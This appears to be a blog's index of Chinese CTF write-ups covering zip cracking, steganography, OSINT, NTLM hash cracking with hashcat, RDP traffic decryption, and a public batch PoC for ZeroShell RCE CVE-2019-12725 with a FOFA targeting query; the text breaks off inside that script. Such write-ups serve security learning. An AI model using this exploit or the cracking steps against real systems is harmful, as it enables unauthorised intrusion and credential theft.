<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024 古剑山 Misc Crypto方向 部分WriteUp</title>
    <url>//post/2024gjs/</url>
    <content><![CDATA[<p>先吐槽：Misc和Crypto两个方向真是抽象到我无语得想笑。早上9.02睡眼惺忪爬起来看题，结果吃了三个小时史导致我中饭都吃不下。</p>
<h2 id="Misc">Misc</h2>
<h3 id="蓝书包">蓝书包</h3>
<p>解压后发现182个加密压缩包，尝试爆破解压密码，发现1.zip对应密码是10001，2.zip密码是10002，以此类推到10182。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181556773.png"
                        alt="image-20241130181556773"
                 ></p>
<p>根据此特点写脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&quot;./output&quot;</span></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">183</span>):</span><br><span class="line">    zip_filename = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.zip&quot;</span></span><br><span class="line">    password = <span class="built_in">str</span>(<span class="number">10000</span> + i).encode()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">            zip_file.extractall(path=output_dir, pwd=password)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功解压: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181828909.png"
                        alt="image-20241130181828909"
                 ></p>
<p>完成解压后可以在output目录下看到有saa-szz182个文件，看到saa有png文件头。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181914061.png"
                        alt="image-20241130181914061"
                 ></p>
<p>修改saa为saa.png打开查看发现是很小一张图片，而且缺少文件尾</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182022106.png"
                        alt="image-20241130182022106"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182044355.png"
                        alt="image-20241130182044355"
                 ></p>
<p>猜测是将所有文件拼接后得到完整的图片，于是写脚本进行拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_file_list</span>():</span><br><span class="line">    file_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> first <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>)):</span><br><span class="line">        <span class="keyword">for</span> second <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> third <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">                file_name = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">chr</span>(first)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(second)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(third)&#125;</span>&quot;</span></span><br><span class="line">                file_list.append(file_name)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(file_list) == <span class="number">182</span>:</span><br><span class="line">                    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line">output_file = <span class="string">&quot;output.png&quot;</span></span><br><span class="line">file_list = generate_file_list()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file_name):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">                outfile.write(infile.read())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;拼接文件: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件未找到: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;合成完成，输出文件为: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182236635.png"
                        alt="image-20241130182236635"
                 ></p>
<p>根据题目名“蓝书包”提示为LSB，使用zsteg和stegsolve后无果，寻找cloacked-pixel的key后无果，尝试爆破cloacked-pixel的密钥，得到密钥为<code>654321</code>，解得flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182458310.png"
                        alt="image-20241130182458310"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182522787.png"
                        alt="image-20241130182522787"
                 ></p>
<p><code>flag&#123;8719e663c0507cecbff2db103a7f7cd7&#125;</code></p>
<h3 id="jpg">jpg</h3>
<p>解压后开局一张图，010查看发现文件末尾有PK头隐写zip文件，使用foremost进行提取</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182921007.png"
                        alt="image-20241130182921007"
                 ></p>
<p>发现文件加密，010查看发现flag.pdf为伪加密，修改加密位后解压得到flag.pdf</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183258118.png"
                        alt="image-20241130183258118"
                 ></p>
<p>尝试复制pdf中的文本后可以得到提示无法选中文本<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183324326.png"
                        alt="image-20241130183324326"
                 ></p>
<p>可以借此猜测该pdf是图片一类的东西导出的，使用Photoshop打开发现存在多个图层</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183449139.png"
                        alt="image-20241130183449139"
                 ></p>
<p>扫码得到一串长度为128的字符</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183929365.png"
                        alt="image-20241130183929365"
                 ></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">67f480eff11781617044bd47fb9535cfb0e4b6a09e51daff2107c536e9d4eebb3d517cfea6e3f176d4e0d37a9f3658845f3d1917cfce30a4f44ffa2e0af58485</span><br></pre></td></tr></table></figure>
<p>看到压缩包内的sha512.txt文件大小也是128，可以猜测这一串文字是sha512.txt的明文，利用这个文件进行明文攻击，新建一个sha512.txt然后压缩查看发现CRC值相同</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184527515.png"
                        alt="image-20241130184527515"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184632294.png"
                        alt="image-20241130184632294"
                 ></p>
<p>按照相同方式压缩后进行明文攻击，使用<code>ARCHPR</code>直接找到密码（也可以使用bkcrak）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/aff5dc78aed6d788d64e991a460c225.png"
                        alt="aff5dc78aed6d788d64e991a460c225"
                 ></p>
<p>解压后得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130184853098.png"
                        alt="image-20241130184853098"
                 ></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag&#123;10e23151aa0da35221a81dff81a53b4e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto">Crypto</h2>
<h3 id="cs">cs</h3>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">截获了一段密文字符串jhjnjcjikmkfjjjkkejkkekdjgjcjnjhjnjcjiko,明文就在其中，请你把它找出来？</span><br></pre></td></tr></table></figure>
<p>经过尝试，hnci的ascii码减2后为flag，借此猜测j和k是偏移量，可以将这段密文分为两个等长的部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jjjjkkjjkjkkjjjjjjjk</span><br><span class="line">hncimfjkekedgcnhncio</span><br></pre></td></tr></table></figure>
<p>可知偏移量j为2，根据这个爆破偏移量k</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;jjjjkkjjkjkkjjjjjjjk&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;hncimfjkekedgcnhncio&quot;</span></span><br><span class="line"></span><br><span class="line">k_range = <span class="built_in">range</span>(-<span class="number">100</span>,<span class="number">100</span>) </span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> k_range:</span><br><span class="line">    str3 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] == <span class="string">&quot;j&quot;</span>:</span><br><span class="line">            str3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) - <span class="number">2</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i]) + k)</span><br><span class="line">    results.append(<span class="string">f&quot;k=<span class="subst">&#123;k&#125;</span>: <span class="subst">&#123;str3&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130185545848.png"
                        alt="image-20241130185545848"
                 ></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag&#123;thisisrealflag&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 强网杯初赛 Misc方向 部分WriteUp</title>
    <url>//post/2024qwb/</url>
    <content><![CDATA[<h3 id="givemesecret">givemesecret</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c8c2231ec4b2b987ee88aabff280a0eb.png"
                        alt="c8c2231ec4b2b987ee88aabff280a0eb"
                 ></p>
<h3 id="Master-Of-OSINT">Master Of OSINT</h3>
<p>图1：看上去像是西北方，应该在内蒙新疆青海一带，最远处有一篇湖，百度地图一个个找过去最终在找到地点：</p>
<p><code>青海省海南藏族自治州共和县倒湖茶公路</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-1.png"
                        alt="misc-1"
                 ></p>
<p>图2：根据图片最右侧的建筑，有一个明显的百安居，根据这个建筑入手找到<code>上海浦东新区 百安居(龙阳店)</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-2.png"
                        alt="misc-2"
                 ></p>
<p>图4：根据图中卡车所属公司<code>浙通物流</code>，位于杭州萧山，加上我经常去杭州感觉这个隔音栏就像杭州绕城高速 <code>优美爱有限公司附近</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-3.png"
                        alt="misc-3"
                 ></p>
<p>图5：根据建筑立体和蓝白色围栏初步判定在重庆 <code>重庆市九龙坡区谢家湾立交桥</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-4.png"
                        alt="misc-4"
                 ></p>
<p>图6：根据建筑密度和风格判定在东南方大城市，远处有一个类似H形的建筑 <code>南京聚宝楼招待所</code> 附近</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-5.png"
                        alt="misc-5"
                 ></p>
<p>图7：初步判定大城市，有河，远处有一栋特征明显建筑 <code>湖南省长沙市岳麓区五一大道橘子洲大桥</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-6.png"
                        alt="misc-6"
                 ></p>
<p>图8：应该是海，但是颜色不蓝，可能是入海口的地方，有风车 <code>上海市崇明区G40(沪陕高速)</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-7.png"
                        alt="misc-7"
                 ></p>
<p>图9：根据吊桥顶部形状，根据谷歌识图找到这篇文章<a class="link"   href="https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm" >https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm<i class="fas fa-external-link-alt"></i></a> 确定位置：<code>湖北省武汉市青山区武汉天兴洲长江大桥</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-8.png"
                        alt="misc-8"
                 ></p>
<p>图10：根据立交桥一行字<code>中铁三局集团解说促进浙江经济发展</code>，识图找到<code>新塘高铁公园</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-9.png"
                        alt="misc-9"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://oss.carbo.ink/2024qiangwang/misc-10.png"
                        alt="misc-10"
                 ></p>
<h3 id="谍影重重5-0">谍影重重5.0</h3>
<p>在协议分级中可以初步判断一下流量的种类</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106154448407.png"
                        alt="image-20241106154448407"
                 ></p>
<p>可以看到有很多加密后的SMB3流量，可以根据这篇博客<a class="link"   href="https://blog.csdn.net/qq_30464257/article/details/142205308" >SMB流量分析<i class="fas fa-external-link-alt"></i></a>了解SMB流量协议的组成，在<code>Frame 122</code>中找到<code>NTLM的Hash</code>，也找到很多RDP流量</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106155124903.png"
                        alt="image-20241106155124903"
                 ></p>
<p>根据这篇文章：</p>
<p><a class="link"   href="https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password" >https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password<i class="fas fa-external-link-alt"></i></a></p>
<p>使用tshark导出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -n -r 谍影重重5.0.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160039118.png"
                        alt="image-20241106160039118"
                 ></p>
<p>手动修改为hashcat支持的格式<code>tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></p>
<p>写入<code>hash.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000&quot;</span> &gt; hash.txt</span><br></pre></td></tr></table></figure>
<p>然后使用hashcat进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt --show</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160642565.png"
                        alt="image-20241106160642565"
                 ></p>
<p>获得密码<code>babygirl233</code>，在Wireshark中，编辑 -&gt; 首选项 -&gt; Protocols -&gt; NTLMSSP输入password，即可解密SMB3的加密流量</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161029399.png"
                        alt="image-20241106161029399"
                 ></p>
<p>导出SMB对象可以获得一个<code>flag.7z</code>文件和证书文件<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161114873.png"
                        alt="image-20241106161114873"
                 ></p>
<p>这个是本地RDP证书，需要将证书进行解密</p>
<blockquote>
<p><a class="link"   href="https://github.com/GoSecure/pyrdp/tree/main/docs" >https://github.com/GoSecure/pyrdp/tree/main/docs<i class="fas fa-external-link-alt"></i></a><br>
<a class="link"   href="https://www.haxor.no/en/article/analyzing-captured-rdp-sessions" >https://www.haxor.no/en/article/analyzing-captured-rdp-sessions<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>猜测证书是使用猕猴桃导出的（猕猴桃导出的默认密码是<code>mimikatz</code>）使用该密码解密TLS成功，解密后进行PDU导出，过滤器选择<code>OSI Layer 7</code>，导出后选择<code>.pcap文件</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrdp-convert -o output 1.pcap</span><br></pre></td></tr></table></figure>
<p>转换为pyrdp可读的文件，然后加载<code>pyrdp-player</code>，提取pyrdp文件</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;Return pressed&gt;</span><br><span class="line">&lt;Return released&gt;the</span><br><span class="line">&lt;Shift pressed&gt;</span><br><span class="line">&lt;Shift released&gt;</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;7z</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;password</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;is</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;f&#x27;</span><br><span class="line">&lt;Shift pressed&gt;&#123;</span><br><span class="line">&lt;Shift released&gt;windows</span><br><span class="line">&lt;Shift pressed&gt;_</span><br><span class="line">&lt;Shift released&gt;password</span><br><span class="line">&lt;Shift pressed&gt;&#125;</span><br><span class="line">&lt;Shift released&gt;9347013182&#x27;</span><br><span class="line">&lt;Control pressed&gt;s</span><br><span class="line">&lt;Control released&gt;</span><br><span class="line"></span><br><span class="line"># the 7z password is f&#x27;&#123;windows_password&#125;9347013182&#x27;</span><br></pre></td></tr></table></figure>
<p>得到解压密码是<code>babygirl2339347013182</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106162323513.png"
                        alt="image-20241106162323513"
                 ></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 CISCN x 长城杯铁人三项 Misc方向 部分WriteUp</title>
    <url>//post/2024ciscnccb/</url>
    <content><![CDATA[<p>先吐槽：应急响应狠狠做爽了，一个人、八小时、19道应急响应+取证，隔壁浙警5分钟两个一血，火眼一把梭，没有火眼的我都要做吐了。。还有那个逆天《时间线关联非常重要》，翻了两个小时流量最后几分钟死马当活马医试出来了。逆天</p>
<p>附件链接：<a class="link"   href="https://pan.baidu.com/s/1PQNx3li7YF6Hv_FQ0QhcvQ?pwd=xabe" >https://pan.baidu.com/s/1PQNx3li7YF6Hv_FQ0QhcvQ?pwd=xabe<i class="fas fa-external-link-alt"></i></a></p>
<p>提取码：xabe</p>
<h3 id="Misc-威胁检测与网络流量分析："><strong>Misc 威胁检测与网络流量分析</strong>：</h3>
<h4 id="zeroshell-1"><strong>zeroshell_1</strong></h4>
<p>CTF-NetA一把梭，实际在HTTP流274的Referer里</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/cbUQsKjetryxYRM.png"
                        alt=""
                 ></p>
<h4 id="zeroshell-2"><strong>zeroshell_2</strong></h4>
<p>根据配置文档完成虚拟机配置后可以发现版本为3.9.0，存在CVE-2019-12725漏洞</p>
<p>访问路径后使用如下exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Cr4y0n</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Time    : 2021/5/12</span></span><br><span class="line"><span class="comment"># @Github  : https://github.com/Cr4y0nXX</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> wcwidth <span class="keyword">import</span> wcswidth <span class="keyword">as</span> ww</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rpad</span>(<span class="params">s, n, c=<span class="string">&quot; &quot;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s + (n - ww(s)) * c</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroShell_RCE_POC</span>:</span><br><span class="line">    vulnName = <span class="string">&quot;ZeroShell_RCE&quot;</span></span><br><span class="line">    vulnNameZh = <span class="string">&quot;ZeroShell防火墙设备RCE远程命令执行&quot;</span></span><br><span class="line">    vulnNumber = <span class="string">&quot;CVE-2019-12725&quot;</span></span><br><span class="line">    vulnTime = <span class="string">&quot;2019-07 ?&quot;</span></span><br><span class="line">    vulnVersion = <span class="string">&quot;ZeroShell &lt; 3.9.0&quot;</span></span><br><span class="line">    vulnPath = <span class="string">&quot;/cgi-bin/kerbynet&quot;</span></span><br><span class="line">    vulnScript = <span class="string">&quot;目标批量验证&quot;</span></span><br><span class="line">    pocAuthor = <span class="string">&quot;Sma11New&quot;</span></span><br><span class="line">    FOFA = <span class="string">&#x27;app=&quot;Zeroshell-防火墙&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.banner()</span><br><span class="line">        <span class="variable language_">self</span>.argsClass = <span class="variable language_">self</span>.parseArgs()</span><br><span class="line">        <span class="variable language_">self</span>.args = <span class="variable language_">self</span>.argsClass.parse_args()</span><br><span class="line">        <span class="variable language_">self</span>.hasVuln = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.lock = Lock()</span><br><span class="line">        <span class="variable language_">self</span>.start = time.time()</span><br><span class="line">        <span class="variable language_">self</span>.run()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">banner</span>(<span class="params">self</span>):</span><br><span class="line">        length = <span class="number">70</span></span><br><span class="line">        logo = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            ________            ___________       _____ </span></span><br><span class="line"><span class="string">            ___  __ \______________  /___(_)________  /_</span></span><br><span class="line"><span class="string">            __  /_/ /  __ \  ___/_  / __  /__  ___/  __/</span></span><br><span class="line"><span class="string">            _  ____// /_/ / /__ _  /___  / _(__  )/ /_  </span></span><br><span class="line"><span class="string">            /_/     \____/\___/ /_____/_/  /____/ \__/  </span></span><br><span class="line"><span class="string">                                                 Author:Sma11New</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        msg = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">\033[36m+<span class="subst">&#123;<span class="string">&quot;-&quot;</span> * (length + <span class="number">20</span>)&#125;</span>+\033[0m</span></span><br><span class="line"><span class="string">|   漏洞名称   |   <span class="subst">&#123;rpad(self.vulnNameZh, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">|   漏洞时间   |   <span class="subst">&#123;rpad(self.vulnTime, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">|   漏洞编号   |   <span class="subst">&#123;rpad(self.vulnNumber, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">|   影响版本   |   <span class="subst">&#123;rpad(self.vulnVersion, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">|   漏洞路径   |   <span class="subst">&#123;rpad(self.vulnPath, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">|   脚本功能   |   <span class="subst">&#123;rpad(self.vulnScript, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">|   FOFA语句   |   <span class="subst">&#123;rpad(self.FOFA, length)&#125;</span>  |</span></span><br><span class="line"><span class="string">\033[36m+<span class="subst">&#123;<span class="string">&quot;-&quot;</span> * (length + <span class="number">20</span>)&#125;</span>+\033[0m</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;\033[36m|\033[0m&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[93m&quot;</span> + logo + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化环境</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[36m[*]  Thread:  <span class="subst">&#123;self.args.thread&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[36m[*]  Timeout:  <span class="subst">&#123;self.args.timeout&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        msg = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="variable language_">self</span>.args.file):</span><br><span class="line">            msg += <span class="string">&quot;\033[36m[*]  Load url file successfully\033[0m\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">f&quot;\033[31m[-]  Load url file <span class="subst">&#123;self.args.file&#125;</span> failed\033[0m\033[0m\n&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;failed&quot;</span> <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31[!]  Init failed, Please check the 